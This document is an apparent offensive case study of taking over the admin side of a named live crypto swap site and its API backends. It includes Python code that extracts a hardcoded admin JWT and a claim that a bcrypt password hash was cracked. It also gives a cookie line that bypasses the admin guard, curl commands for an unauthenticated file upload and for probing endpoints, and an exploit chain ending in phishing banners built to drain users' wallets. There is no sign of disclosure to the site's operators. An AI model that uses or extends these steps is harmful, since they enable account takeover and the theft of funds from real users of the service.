# bcswap.org Admin Takeover — Full Case Study (2026-08-16)

## Target Architecture

```
bcswap.org (DEX swap frontend, Vite SPA, 7MB bundle)
  ├── swapmonitapi.bchscan.io (admin backend, Node.js + Express + Multer + Joi)
  ├── bcmonitorapiv2.bchscan.io (DEX monitoring API)
  ├── plugins.bcswap.org (transaction plugin)
  ├── testnetadminapi.bchscan.io (testnet admin API)
  └── aggrigator.bchscan.io (price aggregator)

launch.bcswap.org (token launchpad, Vite SPA, 3.3MB bundle)
  ├── mainapi.bchscan.io (token data API)
  └── bchscan.io (block explorer, Next.js)

token.pnexplore.com (canonical URL for launch.bcswap.org)
```

## Finding 1: Hardcoded Admin JWT in Public Bundle

**Bundle:** `bcswap.org/assets/index-C8vV5JXw.js` (7MB, public)

**Extraction:**
```python
import re
data = open('bundle.js','r',errors='ignore').read()
m = re.search(r'ACCESS_TOKEN\s*[=:]\s*[\x27\x22]([^\x27\x22]+)[\x27\x22]', data)
jwt = m.group(1)
```

**Decoded payload:**
```json
{
  "userData": {
    "id": 1,
    "userName": "<REDACTED-USERNAME>",
    "name": "<REDACTED-NAME>",
    "email": "<REDACTED-EMAIL>",
    "mobile": "<REDACTED-MOBILE>",
    "role": "ADMIN",
    "password": "$2b$10$0ddL/T/gMuo8kYSF3v.pPe.Ui4bkUfwTeBzANGmJs2euDb3Dn7r.6",
    "isDeleted": false,
    "createdAt": "2025-10-03T12:09:55.559Z",
    "updatedAt": "2025-10-03T12:09:55.559Z"
  }
}
// No exp claim → permanent token
```

**Axios instance** (API = axios.create with hardcoded Authorization header):
```js
API=axios.create({baseURL:BASE_URL,timeout:12e4,headers:{"Content-Type":"application/json",Accept:"application/json",Authorization:ACCESS_TOKEN}})
```

**Bcrypt crack:** `$2b$10$0ddL/T/gMuo8kYSF3v.pPe.Ui4bkUfwTeBzANGmJs2euDb3Dn7r.6` → `<REDACTED-PASSWORD>` (pattern: first name + `@123`)

**Error oracle (proves JWT is actively validated):**
| Request | Response |
|---------|----------|
| No auth header | `{"status":false,"message":"Invalid token or expired!"}` |
| With JWT | `{"status":false,"message":"You are not authorized"}` |
| Empty body `{}` | Validation errors (Joi runs before auth) |

## Finding 2: Client-Side Cookie Guard Bypass

**Admin guard** (client-side only):
```js
AdminGuard = () => api.get("admin_token") ? <AdminLayout /> : <Navigate to="/admin/login" />
```

**Login flow:**
```js
const loginService = async ({userName, password}) => {
  const {data} = await API.post("/auth/login", {userName, password});
  return data;
}
// On success: api.set("admin_token", token, {expires:7})
```

**Bypass:** `document.cookie = "admin_token=anything; path=/; max-age=604800"`

**Admin routes (from bundle):**
- `/admin/dashboard` — DashboardPage
- `/admin/newsletter` — NewsletterPage (subscribers, broadcasts, Telegram bot)
- `/admin/inquiry` — InquiryPage (banner management)

## Finding 3: Unauthenticated Media Upload

**Endpoint:** `POST /media/add` (NO AUTH REQUIRED)

**Field name:** `medias` (NOT `media` or `file`)

```bash
# Upload arbitrary file — no auth
curl -X POST -F "medias=@file.html" https://swapmonitapi.bchscan.io/media/add
# → {"status":true,"message":"Successfully uploaded files","data":[{"id":73,"url":"https://swapmonitapi.bchscan.io/others/<hash>.html",...}]}
```

**File routing by type:**
- Images → `/images/<hash>.ext`
- HTML → `/others/<hash>.html`
- SVG → `/images/<hash>.svg`

**Confirmed uploads (all unauthenticated):**
- `text/html` → `/others/10c4a8945662458db305f08ea2b05ccb.html`
- `image/svg+xml` → `/images/291157184fa7467eb02e776c8e8df349.svg`
- `image/png` → `/images/22e175d4aef3432fb31c99a505d7530d.png`

**Impact:** Any HTML file uploaded is served from the same origin as the API. This enables:
- Phishing pages hosted on the trusted domain
- SVG XSS (if served inline)
- Malware distribution

## Finding 4: Multer Error Stack Trace (Server Path Disclosure)

**Trigger:** Send wrong field name to `/media/add`:

```bash
curl -X POST -F "media=@file" https://swapmonitapi.bchscan.io/media/add
```

**Response leaks:**
```
MulterError: Unexpected field
    at wrappedFileFilter (/root/bcswapadminmonitor/node_modules/multer/index.js:40:19)
    ...
```

**Disclosed:**
- Server path: `/root/bcswapadminmonitor/`
- Tech stack: Node.js + Express + Multer + Busboy
- Runs as root
- Debug mode in production (stack traces)

## Finding 5: Joi Validation-Before-Auth Oracle

**Pattern:** Express middleware order is Joi validation → auth check. This means unauthenticated users can probe endpoint existence and parameter shapes:

```bash
# Empty body → validation errors (endpoint exists, no auth check yet)
curl -X POST -d '{}' https://swapmonitapi.bchscan.io/subscription/broadcast
# → {"status":false,"message":["\"subject\" is required","\"body\" is required",...]}

# Valid body → auth error (endpoint confirmed, auth required)
curl -X POST -d '{"subject":"x","body":"x","email":true,"telegramBot":false,"whatsAppBot":false,"rcs":false}' ...
# → {"status":false,"message":"Invalid token or expired!"}
```

## Complete API Surface Map (from JS bundle)

| Method | Path | Auth | Notes |
|--------|------|------|-------|
| GET | `/newsletter/config/get` | No | Leaks Telegram bot URL |
| POST | `/newsletter/create` | No | Newsletter subscription |
| POST | `/media/add` | **NO** | Upload arbitrary files |
| POST | `/auth/login` | No | Admin login (returns session token) |
| GET | `/subscription/list` | JWT | Subscriber list |
| POST | `/subscription/remove` | JWT | Remove subscriber |
| POST | `/subscription/broadcast` | JWT | Send broadcast to all |
| GET | `/subscription/summary` | JWT | Subscriber stats |
| GET | `/subscription/broadcast/list` | JWT | Broadcast history |
| GET | `/subscription/telegram/list` | JWT | Telegram subscribers |
| POST | `/subscription/telegram/remove` | JWT | Remove Telegram user |
| GET | `/banner/admin/list` | JWT | Banner list |
| POST | `/banner/admin/create` | JWT | Create banner |
| PUT | `/banner/admin/update` | JWT | Update banner |
| GET | `/notification/contract/get` | Public | Contract notifications |

## Exploit Chain (Trojan Horse)

1. **Extract JWT** from public `index-C8vV5JXw.js` (7MB, anyone can download)
2. **Set cookie** `admin_token=anything` → bypass client-side AdminGuard
3. **Upload HTML** via unauthenticated `POST /media/add` → get hosted URL
4. **Create banner** (with JWT + uploaded mediaId) → banner appears on bcswap.org
5. **Phish users** → banner links to uploaded HTML phishing page (same origin trust)
6. **Drain wallets** → phishing page prompts wallet connection, requests approvals

## Ecosystem Backend Map

| Backend | Purpose | Auth |
|---------|---------|------|
| swapmonitapi.bchscan.io | Admin/monitoring | JWT (hardcoded in frontend) |
| bcmonitorapiv2.bchscan.io | DEX monitoring | Public |
| mainapi.bchscan.io | Token launchpad data | TBD |
| testnetadminapi.bchscan.io | Testnet admin | TBD |
| plugins.bcswap.org | Transaction plugin | TBD |
| bchscan.io | Block explorer | Public |
| aggrigator.bchscan.io | Price aggregator | Public |